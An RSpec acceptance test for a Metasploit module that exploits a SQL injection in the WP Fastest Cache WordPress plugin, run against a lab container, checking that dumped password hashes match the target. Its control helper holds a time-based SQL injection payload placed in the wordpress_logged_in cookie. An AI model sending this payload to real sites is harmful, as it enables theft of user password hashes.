require 'acceptance_spec_helper'
require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'open3'

RSpec.describe 'WP Fastest Cache genuine SQLi targets', acceptance: true, order: :defined do
  include_context 'module target'

  before(:all) do
    @fc = { commands: [], requests: [], calls: [], reports: [], controls: [], loot: [] }
    @mode = ENV.fetch('FASTEST_CACHE_MODE', 'enabled')
    @release = ENV.fetch('FASTEST_CACHE_RELEASE', '1.2.1')
    @prefix = ENV.fetch('FASTEST_CACHE_PREFIX', '')
    @vulnerable = @release == '1.2.1' && @mode == 'enabled'
    begin
      @baseline = fc_identity('before')
      expect(@baseline.values_at('core', 'php', 'uid', 'database', 'database_role')).to eq(['6.8.3', '8.3.28', 33, 'wp_root', 'module_target@%'])
      expect(@baseline.fetch('prefix')).to eq(@prefix)
      expect(@baseline.fetch('server')).to start_with('11.2.2-MariaDB')
      expect(@baseline.fetch('database_grants').join("\n")).not_to include('ALL PRIVILEGES ON *.*', 'GRANT OPTION')
      catalog = JSON.parse(File.read('test/module_targets/wp_fastest_cache/releases.json')).fetch(@release)
      expect(@baseline.fetch('archive_sha256')).to eq(catalog.fetch('sha256'))
      installed = @mode != 'absent'
      active = !%w[inactive absent].include?(@mode)
      expect(@baseline.values_at('installed', 'active', 'plugin_version')).to eq([installed, active, installed ? @release : nil])
      expect(@baseline.fetch('installed_sha256')).to eq(installed ? catalog.fetch('installed_sha256') : {})
      expect(@baseline.fetch('active_plugins')).to eq(active ? ['wp-fastest-cache/wpFastestCache.php'] : [])
      options = active ? {} : nil
      options['wpFastestCacheStatus'] = 'on' if active && @mode != 'disabled'
      options['wpFastestCacheLoggedInUser'] = 'on' if @mode == 'excluded'
      expect(@baseline.fetch('cache_options')).to eq(options)
      expect(@baseline.fetch('users').map { |user| user.fetch('user_login') }).to eq(%w[module_admin module_author module_subscriber module_editor])
      expect(@baseline.fetch('users').all? { |user| user.fetch('user_pass').start_with?('$wp$2y$') }).to be(true)
      expect(@baseline.values_at('db_error', 'bootstrap_output_base64')).to eq(['', ''])
      if ENV['FASTEST_CACHE_PREFIX_SCOPE'] == '1'
        expect(@baseline.fetch('table_prefix')).to eq('wp_native_')
        tables = @baseline.fetch('visible_users_tables').map { |row| row.values_at('db_name', 'table_name') }
        expect(tables).to include(['wp_root', 'wp_native_users'], ['wp_prefix', 'wp_users'])
        expect(tables).not_to include(['wp_root', 'wp_users'])
        expect(@baseline.fetch('backup_users')).to eq(@baseline.fetch('users'))
      else
        expect(@baseline.fetch('table_prefix')).to eq('wp_')
      end
      fc_controls('before')
      expect(fc_sql("SELECT count(*) FROM information_schema.tables WHERE table_schema='public'").strip).to eq('0')
      expect(fc_sql('SELECT usesuper FROM pg_user WHERE usename=current_user').strip).to eq('f')
      endpoint = target_endpoint('reporting_db')
      expect(console_command("db_connect module_framework:module-target-framework-db-password@#{endpoint.fetch('host')}:#{endpoint.fetch('port')}/module_targets", timeout: 120)).not_to match(/\[-\]|Error|Exception/)
      expect(console_command('db_status')).to include('Connected to module_targets')
      @workspace = "fastest_cache_#{Process.pid}"
      expect(console_command("workspace -a #{@workspace}")).to include(@workspace)
      expect(fc_reports).to eq([])
      output = console_command('irb -e \'puts "FASTEST_PROVENANCE=" + {ruby: RUBY_VERSION, config: Msf::Config.config_directory, owner_sha256: Digest::SHA256.file("modules/auxiliary/scanner/http/wp_fastest_cache_sqli.rb").hexdigest, helper_sha256: Digest::SHA256.file("lib/msf/core/exploit/remote/http/wordpress/sqli.rb").hexdigest}.to_json\'')
      @fc[:provenance] = JSON.parse(output.match(/^FASTEST_PROVENANCE=(.+)$/)[1])
      expect(@fc[:provenance].fetch('config')).to eq(ENV.fetch('MSF_CFGROOT_CONFIG'))
      expect(@fc[:provenance].fetch('owner_sha256')).to eq(Digest::SHA256.file('modules/auxiliary/scanner/http/wp_fastest_cache_sqli.rb').hexdigest)
      expect(@fc[:provenance].fetch('helper_sha256')).to eq(Digest::SHA256.file('lib/msf/core/exploit/remote/http/wordpress/sqli.rb').hexdigest)
      @fc[:preflight] = 'passed'
    ensure
      fc_save
    end
  end

  after(:all) do
    if @fc&.key?(:preflight)
      fc_controls('after')
      expect(fc_identity('after')).to eq(@baseline)
      output = console_command('irb -e \'puts "FASTEST_STATE=" + {sessions: framework.sessions.keys, jobs: framework.jobs.keys}.to_json\'')
      expect(output).to include('FASTEST_STATE={"sessions":[],"jobs":[]}')
    end
  ensure
    fc_save
  end

  Integer(ENV.fetch('FASTEST_CACHE_REPEATS', '1')).times do |iteration|
    it "verifies complete native data or rejection on public run #{iteration + 1}" do
      options = { 'SqliDelay' => 0.4, 'HttpClientTimeout' => 5, 'TARGETURI' => @prefix + '/', 'VERBOSE' => true }
      options['COUNT'] = Integer(ENV.fetch('FASTEST_CACHE_COUNT')) if ENV.key?('FASTEST_CACHE_COUNT')
      @fc.fetch(:calls) << { action: 'run', options: options, state: 'started' }
      fc_save
      started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
      output = run_target_module('auxiliary/scanner/http/wp_fastest_cache_sqli', 'app', options, allow_errors: true, command_timeout: 480)
      @fc.fetch(:calls).last.merge!(state: 'returned', seconds: Process.clock_gettime(Process::CLOCK_MONOTONIC) - started, output_base64: Base64.strict_encode64(output.b))
      fc_save
      expect(output).not_to match(/Unknown datastore option|Connection failed|Exception|NoMethodError/)
      rows = fc_reports
      if @vulnerable
        expect(output).not_to match(/Auxiliary (?:failed|aborted)/)
        expect(output).to include('Target is vulnerable to SQLi!', 'Loot saved to:')
        expect(rows.length).to eq(Integer(ENV.fetch('FASTEST_CACHE_COUNT', '1')))
        expect(rows.map { |row| row.fetch('username') }.uniq.length).to eq(rows.length)
        native = @baseline.fetch('users').to_h { |user| user.values_at('user_login', 'user_pass') }
        rows.each do |row|
          expect(row.fetch('private_data')).to eq(native.fetch(row.fetch('username')))
          expect(row.values_at('type', 'origin_type', 'module_full_name', 'proto', 'address', 'port')).to eq(['Metasploit::Credential::NonreplayableHash', 'Metasploit::Credential::Origin::Service', 'auxiliary/scanner/http/wp_fastest_cache_sqli', 'tcp', target_endpoint('app').fetch('host'), target_endpoint('app').fetch('port')])
        end
        path = output.match(/Loot saved to: (.+)$/)[1].strip
        expect(File.expand_path(path)).to start_with(File.expand_path(ENV.fetch('MSF_CFGROOT_CONFIG')) + '/')
        expected = rows.map { |row| "Username: #{row.fetch('username')}, Password Hash: #{row.fetch('private_data')}\n".b }
        expect(File.binread(path).lines.sort).to eq(expected.sort)
        @fc.fetch(:loot) << { path: path, bytes: File.size(path), sha256: Digest::SHA256.file(path).hexdigest, complete_native_rows: rows.length }
      else
        expect(output).to include('Target is not vulnerable or delay is too short.')
        expect(output).not_to include('Target is vulnerable to SQLi!', 'Loot saved to:')
        expect(rows).to eq([])
      end
      fc_save
    ensure
      @fc.fetch(:calls).last[:console_base64] = Base64.strict_encode64(console.all_data.b) unless @fc.fetch(:calls).empty?
      fc_save
    end
  end

  def fc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-fastest-cache.json'), JSON.pretty_generate(@fc)) if @fc
  end

  def fc_command(label, role, *arguments, user: nil)
    argv = target_runtime.fetch('compose') + ['exec', '-T']
    argv += ['--user', user] if user
    argv += [role, 'timeout', '30', *arguments]
    output, error, status = Open3.capture3(*argv)
    @fc.fetch(:commands) << { label: label, argv: argv, stdout_base64: Base64.strict_encode64(output), stderr: error, exit: status.exitstatus }
    fc_save
    raise "Native fastest-cache command failed: #{label}: #{error}" unless status.success?

    output
  end

  def fc_identity(label)
    JSON.parse(fc_command(label, 'app', 'php', '/opt/module-target/control.php', user: 'www-data'))
  end

  def fc_request(phase, path, cookie = nil)
    endpoint = target_endpoint('app')
    request = Net::HTTP::Get.new(path)
    request['Host'] = 'module-target.test'
    request['Cookie'] = cookie if cookie
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 10
    http.max_retries = 0
    started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    response = http.request(request)
    elapsed = Process.clock_gettime(Process::CLOCK_MONOTONIC) - started
    @fc.fetch(:requests) << { phase: phase, path: path, cookie: cookie, code: response.code, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b), seconds: elapsed }
    fc_save
    [response, elapsed]
  end

  def fc_controls(phase)
    response, = fc_request(phase, @prefix + '/wp-login.php')
    expect(response.code).to eq('200')
    expect(response.body).to include('name="log"', 'name="pwd"', 'wp-submit')
    timings = {}
    %w[false true].each do |truth|
      condition = truth == 'true' ? '1=1' : '1=2'
      cookie = 'wordpress_logged_in=module-native-missing" OR (SELECT 0 FROM (SELECT IF(' + condition + ',SLEEP(0.8),0)) nativecache) OR "native"="ignored'
      response, timings[truth] = fc_request(phase, @prefix + '/wp-admin.php', cookie)
      expect(response.code).to eq('404')
    end
    if @vulnerable
      expect(timings.fetch('true')).to be >= 0.65
      expect(timings.fetch('true') - timings.fetch('false')).to be >= 0.5
    else
      expect(timings.values.max).to be < 0.5
      expect((timings.fetch('true') - timings.fetch('false')).abs).to be < 0.3
    end
    %w[app db reporting_db].each do |role|
      %w[memory.events pids.events].each do |key|
        text = fc_command(phase + role + key, role, 'cat', '/sys/fs/cgroup/' + key)
        values = text.lines.to_h do |line|
          name, value = line.split
          [name, Integer(value)]
        end
        expect(values.values_at('oom', 'oom_kill')).to eq([0, 0]) if key == 'memory.events'
        expect(values.fetch('max')).to eq(0) if key == 'pids.events'
      end
    end
    @fc.fetch(:controls) << { phase: phase, timings: timings, status: 'passed' }
    fc_save
  end

  def fc_sql(query)
    fc_command('sql', 'reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
  end

  def fc_reports
    raise 'Invalid module workspace' unless @workspace.match?(/\Afastest_cache_[0-9]+\z/)

    rows = JSON.parse(fc_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.username),'[]'::json) FROM (
        SELECT p.username,s.data AS private_data,s.type,s.jtr_format,c.origin_type,o.module_full_name,
          service.name AS service,service.port,service.proto,host(h.address::inet) AS address
        FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id
        LEFT JOIN metasploit_credential_publics p ON p.id=c.public_id LEFT JOIN metasploit_credential_privates s ON s.id=c.private_id
        LEFT JOIN metasploit_credential_origin_services o ON o.id=c.origin_id AND c.origin_type='Metasploit::Credential::Origin::Service'
        LEFT JOIN services service ON service.id=o.service_id LEFT JOIN hosts h ON h.id=service.host_id
        WHERE w.name='#{@workspace}'
      ) row
    SQL
    @fc.fetch(:reports) << { workspace: @workspace, rows: rows }
    fc_save
    rows
  end
end
